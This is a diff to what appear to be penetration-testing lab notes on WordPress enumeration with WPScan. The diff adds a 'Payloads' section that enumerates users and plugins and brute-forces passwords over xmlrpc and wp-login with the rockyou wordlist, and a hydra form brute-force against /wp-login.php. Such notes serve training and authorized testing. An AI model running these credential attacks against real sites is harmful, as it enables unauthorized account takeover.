@@ -1,3 +1,31 @@
+#### Payloads
+```bash
+# get token in https://wpscan.com/
+wpscan --url https://www.luminex.htb --disable-tls-checks --api-token $WPSCAN_API
+wpscan --url http://blog.inlanefreight.com --enumerate --api-token $WPSCAN_API
+```
+
+```sh
+#user enumeration 
+wpscan --url https://$target -e u --no-banner --disable-tls-checks
+# HTTP
+wpscan --url http://$target -e vp,vt --no-banner --detection-mode aggressive --api-token $WPSCAN_API
+# HTTPS
+wpscan --url https://$target -e vp --no-banner --disable-tls-checks
+```
+
+```sh
+wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
+```
+
+```sh
+wpscan --password-attack xmlrpc -t 10 -U admin,roger -P /usr/share/wordlists/rockyou.txt  --url http://$target --no-banner
+
+wpscan --password-attack wp-login -t 20 -U usernames.txt -P /usr/share/wordlists/rockyou.txt --url http://$target --no-banner
+
+hydra -l cameron -P /usr/share/wordlists/rockyou.txt $target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=Invalid username"
+```
+
 # WordPress Core Version Enumeration
 An essential part of the enumeration phase is uncovering the software version number.
 We can search for the `meta generator` tag using the shortcut `[CTRL + F]` in the browser or use `cURL` along with `grep` from the command line to filter for this information.
@@ -193,26 +221,3 @@ Review the various WPScan options using the below Parrot instance by opening a s
 
 The `--enumerate` flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments `--enumerate ap`. 
 Note: The default number of threads used is 5, however, this value can be changed using the "-t" flag.
-#### WPScan Enumeration
-```bash
-# get token in https://wpscan.com/
-wpscan --url https://www.luminex.htb --disable-tls-checks --api-token $WPSCAN_API
-wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
-```
-
-```sh
-wpscan --url https://$target -e u --no-banner --disable-tls-checks
-# HTTP
-wpscan --url http://$target -e vp --no-banner --detection-mode aggressive
-# HTTPS
-wpscan --url https://$target -e vp --no-banner --disable-tls-checks
-```
-
-```sh
-wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
-```
-
-```sh
-wpscan --password-attack xmlrpc -t 20 -U cameron -P /usr/share/wordlists/rockyou.txt  --url http://$target
-wpscan --password-attack xmlrpc -t 20 -U admin,roger -P /usr/share/wordlists/rockyou.txt  --url http://$target
-```
